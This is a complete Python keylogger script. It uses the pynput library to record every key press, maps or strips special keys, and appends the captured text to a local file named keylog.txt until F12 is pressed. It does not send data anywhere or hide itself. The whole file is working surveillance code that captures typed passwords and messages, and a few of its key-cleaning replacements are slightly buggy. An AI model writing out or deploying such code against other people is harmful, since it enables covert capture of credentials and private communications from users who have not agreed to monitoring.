from pynput.keyboard import Listener

def keyboardLog(key):
    char = str(key)
    txt_file = "keylog.txt"

    # Exit statement
    if char == "Key.f12":
        return False

    # Keyboard Cleaner
    char = char.replace("'", "")
    char = char.replace("Key.space", " ")
    char = char.replace("Key.enter", "\n")
    char = char.replace("Key.shift", "")
    char = char.replace("Key.tab", "\t")
    char = char.replace("Key.caps_lock", "")
    char = char.replace("Key.ctrl_l", "")
    char = char.replace("Key.cmd", "")
    char = char.replace("Key.up", "")
    char = char.replace("Key.right", "")
    char = char.replace("Key.down", "")
    char = char.replace("Key.left", "")
    char = char.replace("Key.alt_l", "")
    char = char.replace("Key.alt_gr", "")
    char = char.replace("Key.shift_r", "")
    char = char.replace("Key.esc", "")
    char = char.replace("Key.f1", "")
    char = char.replace("Key.f2", "")
    char = char.replace("Key.f3", "")
    char = char.replace("Key.f4", "")
    char = char.replace("Key.f5", "")
    char = char.replace("Key.f6", "")
    char = char.replace("Key.f7", "")
    char = char.replace("Key.f8", "")
    char = char.replace("Key.f9", "")
    char = char.replace("Key.f10", "")
    char = char.replace("Key.f11", "")
    char = char.replace("Key.num_lockKey.num_lock", "")
    char = char.replace("Key.home", "")
    char = char.replace("Key.end", "")
    char = char.replace("Key.delete", "")
    char = char.replace("Key.page_up", "")
    char = char.replace("Key.page_down", "")
    char = char.replace("Key.insert", "")

    # Backspace
    if char == "Key.backspace":
        erase = ""

        with open(txt_file) as log:
            char = log.read()
        
        char = char[:-1]
        with open(txt_file, "w") as log:
            log.write(erase)


    # Writes to file
    with open(txt_file, "a") as log:
        log.write(char)

with Listener(on_press = keyboardLog) as ear:
    ear.join()